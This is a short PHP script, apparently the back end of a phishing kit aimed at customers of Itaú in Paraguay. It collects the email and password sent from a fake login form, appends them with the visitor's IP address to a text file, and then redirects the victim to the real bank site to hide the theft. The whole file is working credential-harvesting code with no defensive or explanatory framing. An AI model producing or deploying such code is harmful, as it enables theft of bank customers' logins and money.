<?php
$datod = $_POST['mai'];
$datof = $_POST['pass'];
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$archivo="nikekako26.txt";
$file=fopen($archivo,"a");
fwrite($file, "Mail: ".$datod.PHP_EOL);
fwrite($file, "Pass:".$datof.PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "***********************".PHP_EOL);
fclose($file);
Header ("Location:https://www.itau.com.py");?>